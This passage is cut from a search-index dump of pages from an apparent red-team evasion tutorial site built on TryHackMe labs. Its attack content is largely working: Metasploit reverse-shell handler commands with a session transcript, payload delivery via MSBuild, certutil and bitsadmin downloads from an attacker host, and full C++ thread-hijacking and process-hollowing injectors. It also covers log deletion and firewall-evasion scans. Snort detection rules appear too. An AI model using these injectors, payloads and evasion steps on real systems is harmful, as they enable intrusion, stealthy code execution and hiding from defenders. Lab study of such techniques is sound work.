liv0ff.ps1 PowerLessShell Run the Metasploit framework to listen and wait for the reverse shell: $ msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4444 ;exploit\" [*] Using configured payload generic/shell_reverse_tcp payload => windows/meterpreter/reverse_winhttps lhost => AttackBox_IP lport => 4444 [*] Started HTTPS reverse handler on https://AttackBox_IP:4444 Change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool. Then run the PowerLessShell tool and set the source file to the one created with msfvenom: $ cd PowerLessShell $ python2 PowerLessShell.py -type powershell -source ../liv0ff.ps1 -output liv0ff.csproj PowerLessShell Less is More Mr.Un1k0d3r RingZer0 Team ----------------------------------------------------------- Generating the msbuild file using include/template-powershell.csproj as the template File 'liv0ff.csproj' created Process completed Transfer the output file to the target machine with scp or setting a web server to host the file on the attacking machine and downloading the file using a browser. $ python3 -m http.server On the target machine: PS C:\\Users\\thm\\Desktop> wget http://10.18.22.77:8000/liv0ff.csproj -O liv0ff.csproj Build the .csproj file and wait for the reverse shell: c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe c:\\Users\\thm\\Desktop\\liv0ff.csproj Microsoft (R) Build Engine version 4.8.3761.0 [Microsoft .NET Framework, version 4.0.30319.42000] Copyright (C) Microsoft Corporation. All rights reserved. Build started 11/5/2022 9:31:42 PM. On the attack machine: $ msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.18.22.77;set lport 4444;exploit\" [*] Using configured payload generic/shell_reverse_tcp payload => windows/meterpreter/reverse_winhttps lhost => 10.18.22.77 lport => 4444 [*] Started HTTPS reverse handler on https://10.18.22.77:4444 [!] https://10.18.22.77:4444 handling request from 10.10.60.49; (UUID: s5qzyosq) Without a database connected that payload UUID tracking will not work! [*] https://10.18.22.77:4444 handling request from 10.10.60.49; (UUID: s5qzyosq) Staging x86 payload (176732 bytes) ... [!] https://10.18.22.77:4444 handling request from 10.10.60.49; (UUID: s5qzyosq) Without a database connected that payload UUID tracking will not work! [*] Meterpreter session 1 opened (10.18.22.77:4444 -> 10.10.60.49:50104) at 2022-11-05 21:32:09 +0000 meterpreter > The Desktop of the thm user on the target machine now has a flag.txt file. Resources  theonlykernel/atomic-red-team",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1bd6ff89fe21aef6c35367c5db028985",
    "u": "https://evasion.tymyrddin.dev/docs/injection/thread",
    "t": "Thread execution hijacking ",
    "c": "Thread execution hijacking  This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state. Overview  Locate and open a target process to control ( OpenProcess ). Allocate memory region for malicious code ( VirtualAllocEx ). Write malicious code to allocated memory ( WriteProcessMemory ). Identify the thread ID of the target thread to hijack ( CreateToolhelp32Snapshot() , Process32First() , and Process32Next() , to loop through a snapshot of a process and extend capabilities to enumerate process information). Open the target thread ( OpenThread ). Suspend the target thread ( SuspendThread ). Obtain the thread context ( GetThreadContext ). Update the instruction pointer to the malicious code. Rewrite the target thread context ( SetThreadContext ). Resume the hijacked thread ( ResumeThread ). C++ code  #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <iomanip> #include <Shlwapi.h> #include <thread> #include <stdio.h> #pragma comment( lib, \"shlwapi.lib\") #define print(format, ...) fprintf (stderr, format, __VA_ARGS__) DWORD GetPID(const char* pn) { DWORD procId = 0; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnap != INVALID_HANDLE_VALUE) { PROCESSENTRY32 pE; pE.dwSize = sizeof(pE); if (Process32First(hSnap, &pE)) { if (!pE.th32ProcessID) Process32Next(hSnap, &pE); do { if (!_stricmp(pE.szExeFile, pn)) { procId = pE.th32ProcessID; print(\"[+] Process %s found : 0x%lX\\n\", pE.szExeFile, pE.th32ProcessID); break; } } while (Process32Next(hSnap, &pE)); } } CloseHandle(hSnap); return procId; } DWORD EnThread(DWORD procID) { HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); DWORD ThID; if (procID == 0x0) EXIT_FAILURE; if (hSnap != INVALID_HANDLE_VALUE) { THREADENTRY32 pE; pE.dwSize = sizeof(pE); if (Thread32First(hSnap, &pE)) { do { if (procID == pE.th32OwnerProcessID) { ThID = pE.th32ThreadID; print(\"[+] Thread found : 0x%lX\\n\", pE.th32OwnerProcessID); break; } } while (Thread32Next(hSnap, &pE)); } } CloseHandle(hSnap); return(ThID); } int main(void) { unsigned char ExecBuffer[] = \"\\x33\\xc9\\x64\\x8b\\x49\\x30\\x8b\\x49\\x0c\\x8b\\x49\\x1c\" \"\\x8b\\x59\\x08\\x8b\\x41\\x20\\x8b\\x09\\x80\\x78\\x0c\\x33\" \"\\x75\\xf2\\x8b\\xeb\\x03\\x6d\\x3c\\x8b\\x6d\\x78\\x03\\xeb\" \"\\x8b\\x45\\x20\\x03\\xc3\\x33\\xd2\\x8b\\x34\\x90\\x03\\xf3\" \"\\x42\\x81\\x3e\\x47\\x65\\x74\\x50\\x75\\xf2\\x81\\x7e\\x04\" \"\\x72\\x6f\\x63\\x41\\x75\\xe9\\x8b\\x75\\x24\\x03\\xf3\\x66\" \"\\x8b\\x14\\x56\\x8b\\x75\\x1c\\x03\\xf3\\x8b\\x74\\x96\\xfc\" \"\\x03\\xf3\\x33\\xff\\x57\\x68\\x61\\x72\\x79\\x41\\x68\\x4c\" \"\\x69\\x62\\x72\\x68\\x4c\\x6f\\x61\\x64\\x54\\x53\\xff\\xd6\" \"\\x33\\xc9\\x57\\x66\\xb9\\x33\\x32\\x51\\x68\\x75\\x73\\x65\" \"\\x72\\x54\\xff\\xd0\\x57\\x68\\x6f\\x78\\x41\\x01\\xfe\\x4c\" \"\\x24\\x03\\x68\\x61\\x67\\x65\\x42\\x68\\x4d\\x65\\x73\\x73\" \"\\x54\\x50\\xff\\xd6\\x57\\x68\\x72\\x6c\\x64\\x21\\x68\\x6f\" \"\\x20\\x57\\x6f\\x68\\x48\\x65\\x6c\\x6c\\x8b\\xcc\\x57\\x57\" \"\\x51\\x57\\xff\\xd0\\x57\\x68\\x65\\x73\\x73\\x01\\xfe\\x4c\" \"\\x24\\x03\\x68\\x50\\x72\\x6f\\x63\\x68\\x45\\x78\\x69\\x74\" \"\\x54\\x53\\xff\\xd6\\x57\\xff\\xd0\"; DWORD pr; CONTEXT context; context.ContextFlags = CONTEXT_FULL; HANDLE htd,proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID(\"JEEZ.exe\")); if (!proc) { print(\"[!] Process Not found (0x%lX)\\n\", GetLastError()); return -1; } print(\"[+] Process Opened Successfully :0x%lX\\n\", GetLastError()); void* base = VirtualAllocEx(proc, NULL, sizeof(ExecBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!base) { CloseHandle(proc); return -1; } if (!WriteProcessMemory(proc, base, ExecBuffer, sizeof(ExecBuffer), 0)) { CloseHandle(proc); return -1; } print(\"[+] shellcode Base address : 0x%08x\\n\", base); htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr)); if (!htd) { CloseHandle(proc); return -1; } if (SuspendThread(htd) == (DWORD)-1) { CloseHandle(proc); CloseHandle(htd); return -1; } if (!GetThreadContext(htd, &context)) { ResumeThread(htd); CloseHandle(proc); CloseHandle(htd); return -1; } print(\"[+] EIP hold: 0x%08x\\n\", context.Eip); context.Eip = (DWORD)base; if (!SetThreadContext(htd, &context)) { ResumeThread(htd); CloseHandle(proc); CloseHandle(htd); return -1; } print(\"[+] EIP Hijacked succesfully : 0x%08x\\n\", context.Eip); if (ResumeThread(htd) == (DWORD)-0b01) { CloseHandle(proc); CloseHandle(htd); return -1; } print(\"[+] thread Resumed succesfully : 0x%08x\\n\", context.Eip); if ((pr = WaitForSingleObject(htd, INFINITE) == 0x00000080L) || (pr == 0x00000000L) || (pr == 0x00000102L) || (pr == (DWORD)0xFFFFFFFF)) { CloseHandle(proc); CloseHandle(htd); return -1; } print(\"[+] Thread finished Succesfully 0x%lX\\n\", htd); CloseHandle(proc); CloseHandle(htd); __asm { xor eax, eax } } Resources  MITRE: Thread execution hijacking",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0c27f0c6eec30ae0ea02e3ac6542521e",
    "u": "https://evasion.tymyrddin.dev/docs/runtime/downgrade",
    "t": "PowerShell downgrade ",
    "c": "PowerShell downgrade  The PowerShell downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features. Most PowerShell sessions will start with the most recent PowerShell engine, but attackers can manually change the version. By “downgrading” the PowerShell version to 2.0, security features that were not implemented until version 5.0 can be bypassed. The attack only requires a one-liner. Launch a new PowerShell process with the flags -Version to specify the version. PowerShell -Version 2 This attack can actively be seen exploited in tools such as Unicorn . full_attack = '''powershell /w 1 /C \"sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + \")\" + '\"' Since this attack is extremely low-hanging fruit and simple, there are many ways for the blue team to detect and mitigate this attack. The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5bd8b885fb1a16be474e25b1479aa224",
    "u": "https://evasion.tymyrddin.dev/docs/sandbox/bar",
    "t": "An adversary walks into a sandbox ",
    "c": "An adversary walks into a sandbox  Malware Analysis is the process of analyzing a suspicious file to determine what it does on both a micro level (by looking at Assembly), and a macro level (by looking at what it does on the system). This process lets Blue Teamers gain a better understanding of malicious programs, which can aid them in developing detections. There are two ways that a Blue Teamer can analyze a suspicious file One way is by Static Analysis, looking at the code on a micro-level (as previously stated) by using Disassemblers such as IDA or Ghidra. Another way is by Dynamic Analysis, observing what happens when a suspicious file is executed on the system. On the system, there are often many analysis tools installed, such as EDR Software, Sysmon, ProcMon, Process Hacker, and Debuggers (For example, OllyDebug, WinDbg, x64Dbg), and much more. One of the most creative and effective ways that Blue Teamers have come up with to analyse suspicious-looking files is in the category of Dynamic Analysis. This method involves running the file in a containerised (or virtualised) environment, referred to as a Sandbox. Depending on the sandbox of choice, it can be customised for what version of Windows is running, the software installed on the machine, etc. Sandboxes provide a safe and effective way to monitor what a suspicious-looking file does before running it on a production system (or allowing it to be sent to a production system). There are many commercial Sandboxes that may be in place in various parts of a network. Each sandbox may work differently; for example, a Firewall may execute the attachment in the email and see what kind of network communications occur, whereas a Mail sandbox may open the email and see if an embedded file within the email triggers a download over a protocol like SMB in an attempt to steal a NetNTLM hash, where a host-based Anti-Virus Sandbox may execute the file and monitor for malicious programmatic behavior or changes to the system. There are various vendors that make various Sandbox products that Blue Teamers may be able to deploy in a corporate network (just a few examples): Palo Alto Wildfire (Firewall) Proofpoint TAP (Email Sandbox) Falcon Sandbox (EDR/Workstation) MimeCast (Email Sandbox) VirusTotal (Sample Submission Site) Any.Run (Sample Submission Site) Antiscan.me (Sample Submission Site) Joe Sandbox (Sample Submission Site)",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4beebdbac47f36baa2aa0a90ca8bff32",
    "u": "https://evasion.tymyrddin.dev/docs/netsec/systems",
    "t": "IDS/IPS systems ",
    "c": "IDS/IPS systems  Intrusion detection  IDS setups can be divided based on their location in the network into: Host-based IDS (HIDS) Network-based IDS (NIDS) The host-based IDS (HIDS) is installed on an OS along with the other running applications. This setup will give the HIDS the ability to monitor the traffic going in and out of the host; moreover, it can monitor the processes running on the host. The network-based IDS (NIDS) is a dedicated appliance or server to monitor the network traffic. The NIDS should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting the NIDS to a monitor port on the switch. The NIDS will process the network traffic to detect malicious traffic. Snort as signature-based network IDS. Intrusion prevention  For Snort to function as an IPS, it needs some mechanism to block (drop) offending connections. This capability requires Snort to be set up as inline and to bridge two or more network cards. Snort as an IPS if set up inline. IDS Engine types  The detection engine of an IDS can be signature-based and/or anomaly-based. There are issues with both of these engines individually: A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other words, it needs to explicitly be fed the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explicit rules to match against. Signature-based detection has low false positives but can only detect known attacks making them vulnerable to new, evolving attack methods. Anomaly-based IDS needs to have knowledge of what regular traffic looks like. In other words, it needs to be taught what normal is so that it can recognize what is not normal. Teaching the IDS about normal traffic (baseline traffic) can be achieved using machine learning or manual rules. Anomaly-based detection can lead to high numbers of false positives as it alerts all anomalous behaviour. But it has the potential to catch zero-day threats. Fortunately, many IDPS products combine both methodologies to complement their strengths and weaknesses. Rule triggering examples (snort)  Drop all ICMP traffic passing through Snort IPS (drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port)): drop icmp any any -> any any (msg: \"ICMP Ping Scan\"; dsize:0; sid:1000020; rev: 1;) Detect the term ncat in the payload of the traffic exchanged with our webserver: alert tcp any any <> any 80 (msg: \"Netcat Exploitation\"; content:\"ncat\"; sid: 1000030; rev:1;) If we expect to see it in HTTP POST requests ( flow:established tells the Snort engine to look at streams started by a TCP 3-way handshake (established connections)). alert tcp any any <> any 80 (msg: \"Netcat Exploitation\"; flow:established,to_server; content:\"POST\"; nocase; http_method; content:\"ncat\"; nocase; sid:1000032; rev:1;) Resources  Writing Snort Rules with Examples and Cheat Sheet",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "edd8f68194d6a9a2409de4648a95a457",
    "u": "https://evasion.tymyrddin.dev/docs/land/astaroth",
    "t": "Challenge: Astaroth ",
    "c": "Challenge: Astaroth  In 2017, The Windows Defender Advanced Threat Protection (Windows Defender ATP) Research Team discovered Fileless malware named Astaroth. A fileless malware means that the malware runs and is executed in the system without writing to disk. The malware performs all its functions from the victim device’s memory. Astaroth is known as an information stealer, which takes sensitive information from victim users, such as account credentials, keystrokes, and other data, and sends it to the attacker. The malware relies on various advanced techniques such as anti-debugging, anti-virtualization, anti-emulation tricks, process hollowing, NTFS Alternate Data Streams (ADS), and Living off the land binaries to perform different functions. In the initial access stage, attackers rely on a spam campaign that contains malicious attachment files. The attached file is an LNK file shortcut that, once the victim has clicked it, will result in the following: A WMIC command is executed to download and run Javascript code. Abusing the BITSadmin to download multiple binaries from the command and control server. Interestingly, in some cases, the malware uses YouTube channel descriptions to hide their C2 server commands. Using the BITSadmin, ADS technique, to hide their binaries within the system for their persistence. A Certutil tool is used to decode a couple of downloaded payloads into DLL files. The DLL files are executed using Regsvr32. Resources  Astaroth: Banking Trojan Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer Astaroth malware hides command servers in YouTube channel descriptions",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ca90eb593b42d231b7ad3a2ae462050d",
    "u": "https://evasion.tymyrddin.dev/docs/etw/challenge",
    "t": "Challenge ",
    "c": "Challenge  In this scenario, you are a red team operator assigned to build an evasive script to disable ETW and execute a compiled binary. In this scenario, environment integrity is crucial, and the blue team is actively monitoring the environment. Your team has informed you that they are primarily concerned with monitoring web traffic; if halted, they will potentially alert your connection. The blue team is also assumed to be searching for suspicious logs; however, they are not forwarding logs. Create a script to execute a binary or command without interference. PowerShell script block and module logging are enabled. => Disable both GPO settings from the cache for the PowerShell session. Logs are not being forwarded => Delete any 4104 or 4103 logs that were generated. To remove the logs, simply use the Event Viewer GUI. PowerShell script block logs are located in Microsoft/Windows/PowerShell/Operational or Microsoft-Windows-PowerShell . Run the binary agent.exe to get the flag.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "457e419eb71958f4869e970d4230bf11",
    "u": "https://evasion.tymyrddin.dev/docs/injection/hollowing",
    "t": "Process hollowing ",
    "c": "Process hollowing  Overview  How Windows API calls interact with process memory. Create a target process in a suspended state ( CreateProcessA ). Obtain a handle for the malicious image ( CreateFileA ) Allocate enough memory for the image inside the processes own address space ( VirtualAlloc , GetFileSize can be used to retrieve the size of the malicious image for dwSize). Write to local process memory ( ReadFile and CloseHandle ). Identify the location of the process in memory and the entry point ( GetThreadContext and ReadProcessMemory ). Un-map legitimate code from process memory ( ZwUnmapViewOfSection , imported from ntdll.dll). Obtain the size of the image found in file headers (e_lfanew and SizeOfImage from the Optional header ). Write the PE headers then the PE sections ( WriteProcessMemory ). Write each section (NumberOfSections, e_lfanew, and WriteProcessMemory ). Change EAX to point to the entry point ( SetThreadContext ). Take the process out of suspended state ( ResumeThread ). C++ code  #include<Windows.h> #include<stdio.h> #include<iostream> #pragma comment(lib, \"ntdll.lib\") using namespace std; typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID); int main() { LPSTARTUPINFOA target_si = new STARTUPINFOA(); LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); CONTEXT c; //######################################################################### //create Target image for hollowing if (CreateProcessA( (LPSTR)\"C:\\\\Windows\\\\System32\\\\svchost.exe\", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, target_si, target_pi) == 0) { cout << \"[!] Failed to create Target process. Last Error: \" << GetLastError(); return 1; } //######################################################################### // get handle to Malicious program HANDLE hMaliciousCode = CreateFileA( (LPCSTR)\"C:\\\\Users\\\\ryan\\\\Desktop\\\\repos\\\\MalwareProcess\\\\Debug\\\\malwareProcess.exe\", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL ); cout << \"[+] Process PID-> 0x\" << target_pi->dwProcessId << endl; if (hMaliciousCode == INVALID_HANDLE_VALUE) { cout << \"[!] Failed to open Malicious file: \" << GetLastError()<<endl; TerminateProcess(target_pi->hProcess, 0); } cout << \"[+] Malicious file opened.\" << endl; //######################################################################### //Get size of Malicious process in bytes to use in Virtual Alloc DWORD maliciousFileSize = GetFileSize(hMaliciousCode, 0); cout << \"[+] Malicious file size: \" << maliciousFileSize << \" bytes.\" << endl; //######################################################################### //Allocate memory for Malicious process PVOID pMaliciousImage = VirtualAlloc( NULL, maliciousFileSize, 0x3000, 0x04 ); //######################################################################### //Read Malicious exe and write into allocated memory with ReadFile() DWORD numberOfBytesRead; if (!ReadFile( hMaliciousCode, pMaliciousImage, maliciousFileSize, &numberOfBytesRead, NULL )) { cout << \"[!] Unable to read Malicious file into memory. Error: \" <<GetLastError()<< endl; TerminateProcess(target_pi->hProcess, 0); return 1; } CloseHandle(hMaliciousCode); cout << \"[+] Read malicious exe into memory at: 0x\" << pMaliciousImage << endl; //######################################################################### //get thread context to access register values EAX, EBX c.ContextFlags = CONTEXT_INTEGER; GetThreadContext(target_pi->hThread, &c); //Find base address of Target process PVOID pTargetImageBaseAddress; ReadProcessMemory( target_pi->hProcess, (PVOID)(c.Ebx + 8), &pTargetImageBaseAddress, sizeof(PVOID), 0 ); cout << \"[+] Target Image Base Address : 0x\" << pTargetImageBaseAddress << endl; //######################################################################### //Hollow process HMODULE hNtdllBase = GetModuleHandleA(\"ntdll.dll\"); pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, \"ZwUnmapViewOfSection\"); DWORD dwResult = pZwUnmapViewOfSection(target_pi->hProcess, pTargetImageBaseAddress); if (dwResult) { cout << \"[!] Unmapping failed.\" << endl; TerminateProcess(target_pi->hProcess, 1); return 1; } //cout << \"Result: \" << dwResult << endl; cout << \"[+] Process successfully hollowed at Image Base: 0x\"<<pTargetImageBaseAddress<< endl; //######################################################################### //get Malicious image size from NT Headers PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; cout << \"[+] Malicious Image Base Address: 0x\"<<pNTHeaders->OptionalHeader.ImageBase<<endl; PVOID pHollowAddress = VirtualAllocEx( target_pi->hProcess, pTargetImageBaseAddress, sizeOfMaliciousImage, 0x3000, 0x40 ); if (pHollowAddress == NULL) { cout << \"[!] Memory allocation in target process failed. Error: \"<<GetLastError() << endl; TerminateProcess(target_pi->hProcess, 0); return 1; } cout << \"[+] Memory allocated in target at: 0x\" << pHollowAddress << endl; //######################################################################### //write malicious PE headers into target if (!WriteProcessMemory( target_pi->hProcess, pTargetImageBaseAddress, pMaliciousImage, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL )) { cout<< \"[!] Writting Headers failed. Error: \" << GetLastError() << endl; } cout << \"[+] Headers written to memory.\" << endl; //######################################################################### //write malicious PE sections into target for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); WriteProcessMemory( target_pi->hProcess, (PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL ); //cout << \"[+] Section: \" << pSectionHeader->Name <<\" written to memory.\"<< endl; } cout << \"[+] Sections written to memory.\" << endl; //######################################################################### //change victim entry point (EAX thread context) to malicious entry point & resume thread c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); SetThreadContext(target_pi->hThread, &c); ResumeThread(target_pi->hThread); system(\"pause\"); TerminateProcess(target_pi->hProcess, 0); return 0; } Compile it in hollowing-injector.exe . Injection  On the target, find the PID of Powershell run by THM-Attacker (in the Details tab of the Task Manager). PS C:\\Users\\THM-Attacker> cd .\\Desktop\\ PS C:\\Users\\THM-Attacker\\Desktop> cd .\\Injectors\\ PS C:\\Users\\THM-Attacker\\Desktop\\Injectors> .\\hollowing-injector.exe 3904 ... PS C:\\Users\\THM-Attacker\\Desktop\\Injectors> Flag! Resources  MITRE: Process hollowing",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5bcdb586780346174b5dfc50128ebc11",
    "u": "https://evasion.tymyrddin.dev/docs/etw/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Evading Logging and Monitoring What?  Evade Event Tracing for Windows (ETW). Why?  To keep the environment as clean and intact as possible while preventing the logging of session or code. How?  Study ETW Powershell reflection Patching tracing functions Group policy takeover Abusing log pipeline Challenge",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "39f09a0a50c7151baf9cb9fce26dac0f",
    "u": "https://evasion.tymyrddin.dev/docs/land/operations",
    "t": "File operations ",
    "c": "File operations  Certutil  Certutil is a preinstalled tool on Windows OS that can be used to download malicious files and evade Antivirus. Certutil is a CLI tool to dump and display certificate authority (CA), configuration information, configures Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains. It is installed as a part of Certificate Services. It can also be used to transfer and encode files unrelated to certification services. The MITRE ATT&CK framework refers to the first as Ingress tool transfer ( T1105 ), and the second as T1027 . To download a file from an attacker’s web server and store it in the Window’s temporary folder: certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\\Windows\\Temp\\payload.exe -urlcache to display URL, enables the URL option to use in the command. -split -f to split and force fetching files from the provided URL. To encode a payload: certutil -encode payload.exe Encoded-payload.txt certutil -decode Encoded-payload.txt payload.exe BITSAdmin  BITSAdmin is a tool preinstalled on Windows OS that can be used to download malicious files. Background Intelligent Transfer Service Admin is a command-line tool that creates downloads or uploads jobs and monitors their progress. When BITS downloads a file, the actual download is done behind the svchost.exe service. BITSAdmin can be used to download files from or upload files to HTTP web servers and SMB file shares. It takes the cost of the transfer into account, as well as the network usage so that the user’s foreground work is not influenced. BITS has the ability to handle network interruptions, pausing and automatically resuming transfers, even after a reboot. To download using /transfer Switch: bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\\Users\\thm\\Desktop\\payload.exe /Transfer , to use the transfer option. /Download , specifying transfer using download type. /Priority , of the job to be running in the foreground. Findstr  Findstr is a tool pre-installed on Windows that can be used to find text and string patterns in files. It can also be used to download remote files from SMB shared folders within the network. findstr /V dummystring \\\\MachineName\\ShareFolder\\test.exe > c:\\Windows\\Temp\\test.exe /V to print out the lines that do not contain the string provided. dummystring the text to be searched for; in this case, we provide a string that must not be found in a file. > c:\\Windows\\Temp\\test.exe redirect the output to a file on the target machine. Resources  Microsoft Docs: certutil Microsoft Docs: bitsadmin Microsoft Docs: findstr",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "841886c3cb906e3c5dd23a6c4e5548af",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/header-fields",
    "t": "Evasion via modifying header fields ",
    "c": "Evasion via modifying header fields  Nmap allows you to control various header fields that might help evade the firewall. You can: Set IP time-to-live Send packets with specified IP options Send packets with a wrong TCP/UDP checksum Set IP time-to-live  Nmap options include --ttl VALUE to set the TTL to a custom value. This option might be useful if you think the default TTL exposes the port scanning activities. nmap -sS -Pn --ttl 81 -F MACHINE_IP Send packets with specified IP options  Nmap allows for controlling the value set in the IP Options field using --ip-options HEX_STRING , where the hex string can specify the bytes you want to use to fill in the IP Options field. Each byte is written as \\xHH , where HH represents two hexadecimal digits, i.e., one byte. A shortcut provided by Nmap is using the letters to make your requests: R to record-route. T to record-timestamp. U to record-route and record-timestamp. L for loose source routing and needs to be followed by a list of IP addresses separated by space. S for strict source routing and needs to be followed by a list of IP addresses separated by space. The loose and strict source routing can be helpful if you want to try to make your packets take a particular route to avoid a specific security system. Send packets with a wrong TCP/UDP checksum  Another trick is to send packets with an intentionally wrong checksum. Some systems would drop a packet with a bad checksum, while others will not. You can use this to your advantage to discover more about the systems in your network. All you need to do is add the option --badsum to the Nmap command. nmap -sS -Pn --badsum -F MACHINE_IP",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d6bb016369398970682fc9d8650eba8d",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/fragmentation",
    "t": "Evasion via forcing fragmentation, MTU, and data length ",
    "c": "Evasion via forcing fragmentation, MTU, and data length  Control the packet size will allow for: Fragmenting packets, optionally with given MTU. If the firewall, or the IDS/IPS, does not reassemble the packet, it will most likely let it pass. Consequently, the target system will reassemble and process it. Sending packets with specific data lengths. Fragment packets with 8 bytes of data: nmap -sS -Pn -f -F MACHINE_IP Fragment packets with 16 bytes of data: map -sS -Pn -ff -F MACHINE_IP Fragment packets according to a set MTU: nmap -sS -Pn --mtu 8 -F MACHINE_IP Generate packets with specific length: nmap -sS -Pn --data-length 64 -F MACHINE_IP",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "17339d9ec507b956ec542527c04e3a97",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/source-port",
    "t": "Evasion via controlling the source MAC/IP/Port ",
    "c": "Evasion via controlling the source MAC/IP/Port  When scanning a host behind a firewall, the firewall will usually detect and block port scans. This situation would require adaptation of network and port scan to evade the firewall. A network scanner like Nmap provides features to help with such a task: Evasion via controlling the source MAC/IP/Port Evasion via fragmentation, MTU, and data length Evasion through modifying header fields Nmap allows for hiding or spoofing the source with: Decoy(s) Proxy Spoofed MAC Address Spoofed Source IP Address Fixed Source Port Number Decoy(s)  Using decoys mixes the source IP address with other “decoy” IP addresses, making it difficult for the firewall and target host to know where the port scan is coming from. This can exhaust the blue team investigating each source IP address. To add decoy source IP addresses use the -D option to confuse the target: nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP To set Nmap to use random source IP addresses instead of explicitly specifying them: nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP Proxy  Relaying the port scan via a proxy helps keep a source IP address unknown to the target host. This technique allows for keeping an IP address hidden while the target logs to the IP address of the proxy server. To send all packets via a specified proxy server: nmap -sS -Pn --proxies PROXY_URL -F MACHINE_IP Note that you can chain proxies using a comma-separated list. Spoofed MAC address  Nmap allows for spoofing MAC addresses using the option --spoof-mac MAC_ADDRESS . This technique is tricky; spoofing the MAC address works only if the attacking host is on the same network segment as the target host. The target system is going to reply to a spoofed MAC address. If not on the same network segment, sharing the same Ethernet, it would not be possible to capture and read the responses. It allows for exploiting any trust relationship based on MAC addresses. This technique can be used to hide scanning activities on the network. For example, by making scans appear as if coming from a network printer. Spoofed IP address  Nmap allows for spoofing IP addresses using -S IP_ADDRESS . Spoofing the IP address is useful if the attacking system is on the same subnetwork as the target host; otherwise, the replies sent back can not be read. Another use for spoofing IP address is when controlling the system that has that particular IP address. If noticing the target starts to block the spoofed IP address, switch to a different spoofed IP address that belongs to another controlled system. This scanning technique can help maintain a stealthy existence and with exploiting trust relationships on the network based on IP addresses. Fixed Source Port Number  Scanning from one particular source port number can be helpful when discovering the firewalls allows incoming packets from particular source port numbers, such as port 53 or 80. Without inspecting the packet contents, packets from source TCP port 80 or 443 look like packets from a web server, while packets from UDP port 53 look like responses to DNS queries. Set a port number using -g or --source-port options. Resources  OUI Lookup Tool",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "56576bd4f8f5b988e1665d172e58cb33",
    "u": "https://evasion.tymyrddin.dev/docs/uac/auto-exploit",
    "t": "Automated exploitation ",
